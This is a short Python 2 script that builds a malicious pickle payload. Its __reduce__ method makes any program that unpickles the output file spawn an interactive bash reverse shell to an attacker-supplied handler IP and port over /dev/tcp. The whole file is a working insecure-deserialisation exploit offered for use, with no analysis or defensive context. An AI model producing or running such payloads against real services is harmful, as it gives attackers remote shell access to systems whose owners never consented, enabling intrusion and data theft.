#!/usr/bin/env python

import cPickle
import socket
import os
import subprocess
import sys

if len(sys.argv) != 5:
	print 'pickleGenerator.py <TargetIp> <TargetPort> <HandlerIp> <HandlerPort>'
	sys.exit()

class payload(object):

	def  __reduce__(self):
		return (subprocess.Popen,(['/bin/bash','-c','bash -i > /dev/tcp/'+sys.argv[3]+'/'+sys.argv[4]+' 0>&1'],))


payload2 = cPickle.dumps(payload())



f = open('picklepayload','w')
f.write(payload2)
f.close()
